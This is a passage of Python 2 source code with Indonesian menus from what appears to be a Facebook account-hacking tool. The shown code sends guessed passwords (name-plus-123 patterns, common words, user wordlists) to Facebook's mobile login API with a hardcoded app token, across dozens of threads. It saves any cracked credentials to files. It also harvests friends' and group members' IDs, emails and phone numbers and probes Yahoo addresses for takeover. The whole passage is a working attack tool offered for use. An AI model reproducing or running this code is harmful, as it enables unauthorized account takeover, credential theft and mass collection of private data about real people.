                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            y = json.load(data)
                            if 'access_token' in y:
                                print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz5
                                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                                menu_hack()
                            elif 'www.facebook.com' in y['error_msg']:
                                print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                                print '\x1b[1;91m[!] \x1b[1;93mAkun Mungkin Checkpoint'
                                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz5
                                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                                menu_hack()
                            else:
                                print '\x1b[1;91m[!] Maaf, Menghack Akun Gagal  :('
                                print '\x1b[1;91m[!] Coba Metode Lainnya Saja.'
                                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                                menu_hack()
        except KeyError:
            print '\x1b[1;91m[!] Target Tidak Ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_hack()


def crack():
    global file
    global idlist
    global passw
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        idlist = raw_input('\x1b[1;91m[+] \x1b[1;92mFile ID  \x1b[1;91m: \x1b[1;97m')
        passw = raw_input('\x1b[1;91m[+] \x1b[1;92mPassword \x1b[1;91m: \x1b[1;97m')
        try:
            file = open(idlist, 'r')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mSabar Boss Ku \x1b[1;97m...')
            for x in range(40):
                zedd = threading.Thread(target=scrak, args=())
                zedd.start()
                threads.append(zedd)

            for zedd in threads:
                zedd.join()

        except IOError:
            print '\x1b[1;91m[!] File Tidak Ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_hack()


def scrak():
    global back
    global berhasil
    global cekpoint
    global up
    try:
        buka = open(idlist, 'r')
        up = buka.read().split()
        while file:
            username = file.readline().strip()
            url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
            data = urllib.urlopen(url)
            mpsh = json.load(data)
            if back == len(up):
                break
            if 'access_token' in mpsh:
                bisa = open('Berhasil.txt', 'w')
                bisa.write(username + ' | ' + passw + '\n')
                bisa.close()
                berhasil.append('\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ' + username + ' | ' + passw)
                back += 1
            elif 'www.facebook.com' in mpsh['error_msg']:
                cek = open('Cekpoint.txt', 'w')
                cek.write(username + ' | ' + passw + '\n')
                cek.close()
                cekpoint.append('\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + username + ' | ' + passw)
                back += 1
            else:
                gagal.append(username)
                back += 1
            sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack    \x1b[1;91m:\x1b[1;97m ' + str(back) + ' \x1b[1;96m>\x1b[1;97m ' + str(len(up)) + ' =>\x1b[1;92mLive\x1b[1;91m:\x1b[1;96m' + str(len(berhasil)) + ' \x1b[1;97m=>\x1b[1;93mCheck\x1b[1;91m:\x1b[1;96m' + str(len(cekpoint)))
            sys.stdout.flush()

    except IOError:
        print '\n\x1b[1;91m[!] Koneksi Sedang Sibuk'
        time.sleep(0.01)
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] Tidak Ada Koneksi'


def hasil():
    print
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    for b in berhasil:
        print b

    for c in cekpoint:
        print c

    print
    print '\x1b[31m[x] Gagal \x1b[1;97m--> ' + str(len(gagal))
    keluar()


def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '\xe2\x95\x91-> \x1b[1;37;40m1. Hack Dari Daftar Teman'
    print '\xe2\x95\x91-> \x1b[1;37;40m2. Hack Dari Grup'
    print '\xe2\x95\x91-> \x1b[1;37;40m3. Hack Dari File'
    print '\xe2\x95\x91-> \x1b[1;31;40m0. Kembali'
    print '\x1b[1;37;40m\xe2\x95\x91'
    pilih_super()


def pilih_super():
    global oks
    peak = raw_input('\xe2\x95\x9a\xe2\x95\x90\x1b[1;91m\xe2\x96\xb6\x1b[1;97m ')
    if peak == '':
        print "\x1b[1;91m[!] Can't empty"
        pilih_super()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            jalan('\x1b[1;91m[+] \x1b[1;92mMengambil id Teman \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        else:
            if peak == '2':
                os.system('clear')
                print logo
                print 52 * '\x1b[1;97m\xe2\x95\x90'
                idg = raw_input('\x1b[1;91m[+] \x1b[1;92mID Group   \x1b[1;91m:\x1b[1;97m ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
                except KeyError:
                    print '\x1b[1;91m[!] Group Tidak Ditemukan'
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                    super()

                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                s = json.loads(re.text)
                for i in s['data']:
                    id.append(i['id'])

            elif peak == '3':
                os.system('clear')
                print logo
                print 52 * '\x1b[1;97m\xe2\x95\x90'
                try:
                    idlist = raw_input('\x1b[1;91m[+] \x1b[1;92mFile ID  \x1b[1;91m: \x1b[1;97m')
                    for line in open(idlist, 'r').readlines():
                        id.append(line.strip())

                except IOError:
                    print '\x1b[1;91m[!] File Tidak Ditemukan'
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                    super()

            elif peak == '0':
                menu_hack()
            else:
                print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mTidak ada'
                pilih_super()
            print '\x1b[1;96m[+] \x1b[32;1mTotal ID \x1b[1;91m: \x1b[0;1m' + str(len(id))
            titik = ['.   ', '..  ', '... ']
            for o in titik:
                print '\r\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[32;1mHacking \x1b[1;97m' + o,
                sys.stdout.flush()
                time.sleep(1)

        print
        print '\x1b[1;96m[!] \x1b[0;1mSabar Bro, Mending Subscribe Dulu'
        print 42 * '\x1b[1;96m='

        def main(arg):
            user = arg
            try:
                os.mkdir('out')
            except OSError:
                pass

            try:
                a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                b = json.loads(a.text)
                pass1 = b['first_name'] + '123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[33;1m[SIAP DIPAKAI\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m: \x1b[0;1m' + user
                    print '\x1b[33;1m[\xe2\x9c\x93] \x1b[0;1m      Password \x1b[1;91m: \x1b[0;1m' + pass1 + '\n'
                    oks.append(user + pass1)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[32;1m[SIAP DIPAKAI\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m: \x1b[0;1m' + user
                    print '\x1b[32;1m[\xe2\x9c\x93] \x1b[0;1m      Password \x1b[1;91m: \x1b[0;1m' + pass1 + '\n'
                    cek = open('out/super_cp.txt', 'a')
                    cek.write('ID:' + user + ' Pw:' + pass1 + '\n')
                    cek.close()
                    cekpoint.append(user + pass1)
                else:
                    pass2 = 'doraemon'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[33;1m[SIAP DIPAKAI\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m: \x1b[0;1m' + user
                        print '\x1b[33;1m[\xe2\x9c\x93] \x1b[0;1m     Password  \x1b[1;91m: \x1b[0;1m' + pass2 + '\n'
                        oks.append(user + pass2)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[32;1m[SIAP DIPAKAI\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m: \x1b[0;1m' + user
                        print '\x1b[32;1m[\xe2\x9c\x93] \x1b[0;1m      Password \x1b[1;91m: \x1b[0;1m' + pass2 + '\n'
                        cek = open('out/super_cp.txt', 'a')
                        cek.write('ID:' + user + ' Pw:' + pass2 + '\n')
                        cek.close()
                        cekpoint.append(user + pass2)
                    else:
                        pass3 = b['last_name'] + '123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[33;1m[SIAP DIPAKAI\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m: \x1b[0;1m' + user
                            print '\x1b[33;1m[\xe2\x9c\x93] \x1b[0;1m      Password \x1b[1;91m: \x1b[0;1m' + pass3 + '\n'
                            oks.append(user + pass3)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[32;1m[SIAP DIPAKAI\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m: \x1b[0;1m' + user
                            print '\x1b[32;1m[\xe2\x9c\x93] \x1b[0;1m      Password \x1b[1;91m: \x1b[0;1m' + pass3 + '\n'
                            cek = open('out/super_cp.txt', 'a')
                            cek.write('ID:' + user + ' Pw:' + pass3 + '\n')
                            cek.close()
                            cekpoint.append(user + pass3)
                        else:
                            pass4 = 'sayang'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[33;1m[SIAP DIPAKAI\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m: \x1b[0;1m' + user
                                print '\x1b[33;1m[\xe2\x9c\x93] \x1b[0;1m      Password \x1b[1;91m: \x1b[0;1m' + pass4 + '\n'
                                oks.append(user + pass4)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[32;1m[SIAP DIPAKAI\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m: \x1b[0;1m' + user
                                print '\x1b[32;1m[\xe2\x9c\x93] \x1b[0;1m      Password \x1b[1;91m: \x1b[0;1m' + pass4 + '\n'
                                cek = open('out/super_cp.txt', 'a')
                                cek.write('ID:' + user + ' Pw:' + pass4 + '\n')
                                cek.close()
                                cekpoint.append(user + pass4)
                            else:
                                pass5 = 'anjing'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[33;1m[SIAP DIPAKAI\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m: \x1b[0;1m' + user
                                    print '\x1b[33;1m[\xe2\x9c\x93] \x1b[0;1m      Password \x1b[1;91m: \x1b[0;1m' + pass5 + '\n'
                                    oks.append(user + pass5)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[32;1m[SIAP DIPAKAI\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m: \x1b[0;1m' + user
                                    print '\x1b[32;1m[\xe2\x9c\x93] \x1b[0;1m      Password \x1b[1;91m: \x1b[0;1m' + pass5 + '\n'
                                    cek = open('out/super_cp.txt', 'a')
                                    cek.write('ID:' + user + ' Pw:' + pass5 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass5)
                                else:
                                    pass6 = 'pakistan'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[33;1m[SIAP DIPAKAI\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m: \x1b[0;1m' + user
                                        print '\x1b[33;1m[\xe2\x9c\x93] \x1b[0;1m      Password \x1b[1;91m: \x1b[0;1m' + pass6 + '\n'
                                        oks.append(user + pass6)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[32;1m[SIAP DIPAKAI\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m: \x1b[0;1m' + user
                                        print '\x1b[32;1m[\xe2\x9c\x93] \x1b[0;1m      Password \x1b[1;91m: \x1b[0;1m' + pass6 + '\n'
                                        cek = open('out/super_cp.txt', 'a')
                                        cek.write('ID:' + user + ' Pw:' + pass6 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass6)
            except:
                pass

        p = ThreadPool(30)
        p.map(main, id)
        print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;92mSelesai \x1b[1;97m....'
        print '\x1b[1;96m[+] \x1b[33;1mTotal CP/\x1b[32;1mOK \x1b[1;91m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
        print '\x1b[1;96m[+] \x1b[1;92mCP File tersimpan \x1b[1;91m: \x1b[1;97mout/super_cp.txt'
        raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
        super()


def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.5)
        login()
    else:
        os.system('clear')
        print logo
        print '\xe2\x95\x94' + 52 * '\x1b[1;97m\xe2\x95\x90'
        try:
            email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail\x1b[1;97m/\x1b[1;92mHp \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
            passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
            print '\x1b[1;91m[+] \x1b[1;92mTotal\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mSabar Boss Ku \x1b[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mTry \x1b[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        print '\n\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                        print 52 * '\x1b[1;97m\xe2\x95\x90'
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                        keluar()
                    elif 'www.facebook.com' in mpsh['error_msg']:
                        ceks = open('Brutecekpoint.txt', 'w')
                        ceks.write(email + ' | ' + pw + '\n')
                        ceks.close()
                        print '\n\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                        print 52 * '\x1b[1;97m\xe2\x95\x90'
                        print '\x1b[1;91m[!] \x1b[1;93mAkun Mungkin Checkpoint'
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                        keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;91m[!] Koneksi Error'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;91m[!] File Tidak Ditemukan...'
            print '\n\x1b[1;91m[!] \x1b[1;92mSepertinya kamu tidak memiliki wordlist'
            tanyaw()


def tanyaw():
    why = raw_input('\x1b[1;91m[?] \x1b[1;92mKamu ingin membuat  wordlist ? \x1b[1;92m[y/t]\x1b[1;91m:\x1b[1;97m ')
    if why == '':
        print '\x1b[1;91m[!] Mohon Pilih \x1b[1;97m(y/t)'
        tanyaw()
    elif why == 'y':
        wordlist()
    elif why == 'Y':
        wordlist()
    elif why == 't':
        menu_hack()
    elif why == 'T':
        menu_hack()
    else:
        print '\x1b[1;91m[!] Mohon Pilih \x1b[1;97m(y/t)'
        tanyaw()


def menu_yahoo():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '\xe2\x95\x91-> \x1b[1;37;40m1. Dari Teman'
    print '\xe2\x95\x91-> \x1b[1;37;40m2. Dari File'
    print '\xe2\x95\x91-> \x1b[1;31;40m0. Kembali'
    print '\x1b[1;37;40m\xe2\x95\x91'
    yahoo_pilih()


def yahoo_pilih():
    go = raw_input('\xe2\x95\x9a\xe2\x95\x90\x1b[1;91m\xe2\x96\xb6\x1b[1;97m ')
    if go == '':
        print "\x1b[1;91m[!] Can't empty"
        yahoo_pilih()
    elif go == '1':
        yahoofriends()
    elif go == '2':
        yahoolist()
    elif go == '0':
        menu_hack()
    else:
        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + go + ' \x1b[1;91mTidak Ditemukan'
        yahoo_pilih()


def yahoofriends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token Tidak Ada'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    mpsh = []
    jml = 0
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mSabar Boss Ku \x1b[1;97m...')
    friends = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads(friends.text)
    save = open('MailVuln.txt', 'w')
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x1b[1;92m' + vulnot + '\x1b[1;97m]'
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + nama
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + id
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;97m ' + mail + ' [\x1b[1;92m' + vuln + '\x1b[1;97m]'
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                else:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x1b[1;92m' + vulnot + '\x1b[1;97m]'
        except KeyError:
            pass

    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    print '\x1b[1;91m[+] \x1b[1;97mSimpan \x1b[1;91m:\x1b[1;97m MailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    menu_yahoo()


def yahoolist():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        files = raw_input('\x1b[1;91m[+] \x1b[1;92mFile \x1b[1;91m: \x1b[1;97m')
        try:
            total = open(files, 'r')
            mail = total.readlines()
        except IOError:
            print '\x1b[1;91m[!] File Tidak Ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_yahoo()

    mpsh = []
    jml = 0
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mSabar Boss Ku \x1b[1;97m...')
    save = open('MailVuln.txt', 'w')
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;91m[?] \x1b[1;97mStatus \x1b[1;91m:  \x1b[1;97mRed[\x1b[1;92m' + vulnot + '\x1b[1;97m]  Green[\x1b[1;92m' + vuln + '\x1b[1;97m]'
    print
    mail = open(files, 'r').readlines()
    for pw in mail:
        mail = pw.replace('\n', '')
        jml += 1
        mpsh.append(jml)
        yahoo = re.compile('@.*')
        otw = yahoo.search(mail).group()
        if 'yahoo.com' in otw:
            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
            br._factory.is_html = True
            br.select_form(nr=0)
            br['username'] = mail
            klik = br.submit().read()
            jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
            try:
                pek = jok.search(klik).group()
            except:
                print '\x1b[1;91m ' + mail
                continue

            if '"messages.ERROR_INVALID_USERNAME">' in pek:
                save.write(mail + '\n')
                print '\x1b[1;92m ' + mail
            else:
                print '\x1b[1;91m ' + mail

    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m:\x1b[1;97m MailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    menu_yahoo()


def grab():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '\xe2\x95\x91-> \x1b[1;37;40m1. Ambil ID Dari Teman'
    print '\xe2\x95\x91-> \x1b[1;37;40m2. Ambil ID Teman Dari Teman'
    print '\xe2\x95\x91-> \x1b[1;37;40m3. Ambil ID Dari Grup'
    print '\xe2\x95\x91-> \x1b[1;37;40m4. Ambil Email Teman'
    print '\xe2\x95\x91-> \x1b[1;37;40m5. Ambil Email Teman Dari Teman'
    print '\xe2\x95\x91-> \x1b[1;37;40m6. Ambil Nomor Telepon Dari Teman'
    print '\xe2\x95\x91-> \x1b[1;37;40m7. Ambil Nomor Telepon Teman Dari Teman'
    print '\xe2\x95\x91-> \x1b[1;31;40m0. Kembali'
    print '\x1b[1;37;40m\xe2\x95\x91'
    grab_pilih()


def grab_pilih():
    cuih = raw_input('\xe2\x95\x9a\xe2\x95\x90\x1b[1;91m\xe2\x96\xb6\x1b[1;97m ')
    if cuih == '':
        print "\x1b[1;91m[!] Can't empty"
        grab_pilih()
    elif cuih == '1':
        id_friends()
    elif cuih == '2':
        idfrom_friends()
    elif cuih == '3':
        id_member_grup()
    elif cuih == '4':
        email()
    elif cuih == '5':
        emailfrom_friends()
    elif cuih == '6':
        nomor_hp()
    elif cuih == '7':
        hpfrom_friends()
    elif cuih == '0':
        menu_hack()
    else:
        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + cuih + ' \x1b[1;91mTidak Ditemukan'
        grab_pilih()


def id_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            save_id = raw_input('\x1b[1;91m[+] \x1b[1;92mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            bz = open(save_id, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mSabar Boss Ku \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for ah in z['data']:
                idfriends.append(ah['id'])
                bz.write(ah['id'] + '\n')
                print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + ah['name']
                print '\x1b[1;92mID   \x1b[1;91m : \x1b[1;97m' + ah['id']
                print 52 * '\x1b[1;97m\xe2\x95\x90'

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;96m%s' % len(idfriends)
            print '\x1b[1;91m[+] \x1b[1;97mFile Disimpan \x1b[1;91m: \x1b[1;97m' + save_id
            bz.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except KeyError:
            os.remove(save_id)
            print '\x1b[1;91m[!] An error occurred'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def idfrom_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukkan ID Teman \x1b[1;91m: \x1b[1;97m')
            try:
